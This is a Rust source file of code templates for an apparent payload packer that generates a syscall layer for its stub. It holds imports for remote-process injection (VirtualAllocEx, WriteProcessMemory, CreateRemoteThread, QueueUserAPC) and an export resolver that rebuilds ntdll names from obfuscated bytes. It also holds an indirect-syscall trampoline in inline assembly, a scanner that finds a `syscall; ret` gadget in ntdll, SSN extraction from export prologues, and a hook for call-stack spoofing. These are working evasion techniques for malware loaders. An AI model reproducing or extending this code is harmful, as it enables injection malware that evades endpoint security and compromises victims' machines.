//! Prelude templates shared by every rendered syscall block.
//!
//! These are the invariant parts of the generated `mod syscalls { ... }`:
//! the `mode: none` imports and status constants, the no-op init for a
//! pipeline that needs no syscall, and the full `mode: indirect` prelude —
//! the `nt_invoke` trampoline, the `SsnTable` shape and the ntdll gadget
//! scanner.
//!
//! `render_none` / `render_indirect` (in the parent module) fill the `$…$`
//! placeholders and append the per-function helpers.

/// The block when no technique in the pipeline needs syscalls.
pub(crate) const EMPTY_BODY: &str = r#"    /// Initializes the syscall layer. A no-op here: no technique needs it.
    pub fn init_syscalls() -> Result<(), String> {
        Ok(())
    }
"#;

/// Prelude shared by every `mode: none` block (imports + no-op init).
pub(crate) const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
    use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, QueueUserAPC, ResumeThread, SuspendThread, WaitForSingleObject,
    };

    const STATUS_SUCCESS: i32 = 0;
    /// Generic failure for a mapped Win32 call that has no real NTSTATUS.
    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;
    /// Invalid parameter (a null thread start routine, for instance).
    const STATUS_INVALID_PARAMETER: i32 = 0xC000_000Du32 as i32;

    /// Initializes the syscall layer. A no-op when syscalls are disabled.
    pub fn init_syscalls() -> Result<(), String> {
        crate::tech_dbg!("syscalls", "mode none: the nt_* helpers call the Win32 APIs directly");
        Ok(())
    }

    /// Resolves an ntdll export by name and returns its address (0 on failure).
    /// Used by the none-mode helpers for the Nt* functions windows-rs does not
    /// declare. The DLL/function names are reconstructed at runtime from the
    /// obfuscated bytes the packer injects.
    fn resolve_nt_export(name: &str) -> usize {
        let Ok(ntdll) = std::ffi::CString::new($NTDLL_DEF$) else {
            return 0;
        };
        let Ok(fn_name) = std::ffi::CString::new(name) else {
            return 0;
        };
        let Ok(module) = (unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }) else {
            return 0;
        };
        let Some(address) =
            (unsafe { GetProcAddress(module, PCSTR(fn_name.as_ptr() as *const u8)) })
        else {
            return 0;
        };
        address as usize
    }
"#;

/// Prelude of the `mode: indirect` block: trampoline, SSN table, gadget
/// scanner and the resolver body placeholder. `$SSN_FIELDS$` / `$SSN_INIT$` /
/// `$RESOLVER_BODY$` are filled by the renderer in `super`.
pub(crate) const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
    use std::sync::OnceLock;

    use windows::core::PCSTR;
    use windows::Win32::Foundation::{HANDLE, HMODULE};
    use windows::Win32::System::LibraryLoader::{GetModuleFileNameW, GetModuleHandleA, GetProcAddress};

    const STATUS_SUCCESS: i32 = 0;
    /// Generic failure when the layer was not initialized before a call.
    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;

    /// Invokes one NT syscall through the `syscall; ret` gadget in ntdll.
    ///
    /// Windows x64 ABI: arguments 1-4 arrive in rcx/rdx/r8/r9 and every further
    /// argument on the caller's stack, at [rsp+40], [rsp+48], ... (the callee
    /// sees argument 5 at [rsp+40]: 8 bytes of return address plus the 32-byte
    /// shadow space). `syscall` does not push a return address, so the kernel
    /// reads arguments 5+ from exactly those slots — the caller has already
    /// placed them where the kernel expects them, and the trampoline must not
    /// touch them.
    ///
    /// It only sets the three registers `syscall` needs: r10 = argument 1, eax
    /// = SSN, and r11 = the gadget address (the `syscall; ret` sequence). The
    /// gadget's trailing `ret` pops the caller's return address and goes
    /// straight back to the Rust caller.
    ///
    /// The signature is fixed at eleven argument slots (`NtCreateThreadEx` is
    /// the widest call a technique needs; the SSN/gadget pair follows them), so
    /// callers pass unused slots as `0`. The two trailing parameters land after
    /// every syscall argument, which is why they never reach the kernel.
    extern "system" {
        fn $TRAMPOLINE_NAME$(
            arg1: usize,
            arg2: usize,
            arg3: usize,
            arg4: usize,
            arg5: usize,
            arg6: usize,
            arg7: usize,
            arg8: usize,
            arg9: usize,
            arg10: usize,
            arg11: usize,
            ssn: u32,
            gadget: usize,
        ) -> i32;
    }

    /// Stack offset of the SSN argument (the 12th) in `$TRAMPOLINE_NAME$`.
    ///
    /// On entry `[rsp]` is the return address and `[rsp+8, rsp+40)` is the
    /// 32-byte shadow space. Arguments 1-4 arrive in registers, so only
    /// arguments 5..11 sit on the stack (`[rsp+40, rsp+96)`, 7 × 8 bytes); the
    /// SSN (arg12) lands at `rsp+96` and the gadget (arg13) at `rsp+104`.
    /// Wiring the numbers in as `const` operands turns an argument-count change
    /// into a compile error instead of silent stack corruption.
    const SSN_SLOT_OFFSET: usize = 8 + 32 + 7 * 8; // 96
    const GADGET_SLOT_OFFSET: usize = SSN_SLOT_OFFSET + 8; // 104

    global_asm!(
        ".intel_syntax noprefix",
        ".global $TRAMPOLINE_NAME$",
        "$TRAMPOLINE_NAME$:",
        "mov r10, rcx",               // r10 = arg1 (syscall argument convention)
        "mov eax, [rsp + {ssn}]",     // eax = SSN (arg12)
        "mov r11, [rsp + {gadget}]",  // r11 = gadget address (syscall; ret, arg13)
        "jmp r11",
        ssn = const SSN_SLOT_OFFSET,
        gadget = const GADGET_SLOT_OFFSET,
    );

    /// SSNs resolved at startup. The packer emits exactly the fields the
    /// active techniques need.
    struct SsnTable {
$SSN_FIELDS$
    }

    static SSNS: OnceLock<SsnTable> = OnceLock::new();
    /// Address of the first `syscall; ret` gadget in ntdll's `.text`.
    static GADGET: OnceLock<usize> = OnceLock::new();

    /// Why the syscall layer failed to initialize.
    #[derive(Debug, thiserror::Error)]
    enum SyscallError {
        #[error("could not load the native API library")]
        NtdllNotFound,
        #[error("the on-disk native library does not match the loaded module")]
        NtdllMismatch,
        #[error("could not resolve '{0}'")]
        FunctionNotFound(String),
        #[error("could not read the SSN from '{0}': the export prologue is not in the expected form")]
        PatternMismatch(String),
        #[error("could not locate a syscall gadget in the native library")]
        GadgetNotFound,
        /// Reserved for helpers that wrap the NTSTATUS (later phases).
        #[error("syscall invocation failed (0x{0:08x})")]
        #[allow(dead_code)]
        InvocationFailed(i32),
    }

    /// Resolves every SSN the active techniques need and caches the gadget.
    /// The stub calls this once, before the techniques run.
    pub fn init_syscalls() -> Result<(), String> {
        let (table, gadget) = resolve_ssns().map_err(|e| {
            crate::tech_dbg!("syscalls", "initialization failed: {e}");
            e.to_string()
        })?;
        debug_assert!(SSNS.get().is_none(), "init_syscalls called twice");
        debug_assert!(GADGET.get().is_none(), "init_syscalls called twice");
        let _ = SSNS.set(table);
        let _ = GADGET.set(gadget);
$SPOOFING_INIT$
        crate::tech_dbg!("syscalls", "ssn table resolved, gadget at 0x{gadget:x}");
        Ok(())
    }

    /// Returns the SSN when `bytes` starts with the canonical prologue
    /// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`).
    /// Mirrors `engine::syscalls::parse_ssn_prologue` (unit-tested in the
    /// packer).
    fn parse_ssn(bytes: &[u8]) -> Option<u32> {
        let prologue = [0x4C, 0x8B, 0xD1, 0xB8];
        if bytes.len() < 8 || bytes[..4] != prologue {
            return None;
        }
        Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
    }

    /// Scans ntdll for the first `0F 05` followed by a return (`C3` ret or
    /// `CB` retf). The trailing return is mandatory: the trampoline jumps to
    /// the gadget and relies on it to return to the Rust caller, so a bare
    /// `syscall` with anything else after it is not usable.
    /// Mirrors `engine::syscalls::find_gadget_offset` (unit-tested in the
    /// packer).
    fn find_gadget(module: HMODULE) -> Result<usize, SyscallError> {
        let base = module.0 as usize;
        // Prefer `.text` (the canonical location); fall back to the whole
        // mapped image, in case a build keeps the stub outside the first
        // section.
        if let Some((start, len)) = text_range(base) {
            if let Some(at) = scan_gadget(start, len) {
                return Ok(at);
            }
        }
        if let Some((start, len)) = image_range(base) {
            if let Some(at) = scan_gadget(start, len) {
                return Ok(at);
            }
        }
        Err(SyscallError::GadgetNotFound)
    }

    /// Returns the address of the first `0F 05` followed by a return in
    /// `[start, start + len)`.
    ///
    /// `syscall; ret` (`0F 05 C3`) is preferred; `syscall; retf` (`0F 05 CB`)
    /// is only used as a fallback, because a `retf` gadget far-returns and is
    /// only correct if that is what the stub expects.
    fn scan_gadget(start: usize, len: usize) -> Option<usize> {
        let bytes = unsafe { std::slice::from_raw_parts(start as *const u8, len) };
        let mut fallback = None;
        for (i, window) in bytes.windows(3).enumerate() {
            if window[0] == 0x0F && window[1] == 0x05 {
                if window[2] == 0xC3 {
                    return Some(start + i);
                }
                if window[2] == 0xCB && fallback.is_none() {
                    fallback = Some(start + i);
                }
            }
        }
        fallback
    }

    /// Returns the in-memory `[start, size)` of ntdll's `.text` section.
    fn text_range(base: usize) -> Option<(usize, usize)> {
        let dos = base as *const u8;
        if unsafe { *dos } != b'M' || unsafe { *dos.add(1) } != b'Z' {
            return None;
        }
        let e_lfanew = pe_u32(base, 0x3C)? as usize;
        // IMAGE_NT_HEADERS: Signature (4) + FileHeader (20) + OptionalHeader.
        // FileHeader.NumberOfSections is at offset 2, SizeOfOptionalHeader at
        // offset 16; the section table follows the optional header.
        let num_sections = pe_u16(base, e_lfanew.checked_add(4 + 2)?)? as usize;
        let opt_size = pe_u16(base, e_lfanew.checked_add(4 + 16)?)? as usize;
        let table = e_lfanew.checked_add(4 + 20)?.checked_add(opt_size as usize)?;
        for i in 0..num_sections {
            let s = table.checked_add(i * 40)?;
            let name = unsafe { std::slice::from_raw_parts((base + s) as *const u8, 8) };
            if &name[..5] == b".text" {
                let virtual_address = pe_u32(base, s + 12)? as usize;
                let virtual_size = pe_u32(base, s + 8)? as usize;
                let raw_size = pe_u32(base, s + 16)? as usize;
                return Some((base + virtual_address, virtual_size.max(raw_size)));
            }
        }
        None
    }

    /// Returns the in-memory `[base, base + SizeOfImage)` of a mapped image.
    fn image_range(base: usize) -> Option<(usize, usize)> {
        let dos = base as *const u8;
        if unsafe { *dos } != b'M' || unsafe { *dos.add(1) } != b'Z' {
            return None;
        }
        let e_lfanew = pe_u32(base, 0x3C)? as usize;
        // SizeOfImage is at optional-header offset 56 for both PE32 and PE32+.
        let size = pe_u32(base, e_lfanew.checked_add(4 + 20)?.checked_add(56)?)? as usize;
        if size == 0 {
            return None;
        }
        Some((base, size))
    }

    /// Bounds-checked little-endian u16 read from ntdll's mapped image.
    fn pe_u16(base: usize, off: usize) -> Option<u16> {
        let p = base.checked_add(off)?;
        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 2) };
        Some(u16::from_le_bytes([s[0], s[1]]))
    }

    /// Bounds-checked little-endian u32 read from ntdll's mapped image.
    fn pe_u32(base: usize, off: usize) -> Option<u32> {
        let p = base.checked_add(off)?;
        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 4) };
        Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
    }

$RESOLVER_BODY$
"#;
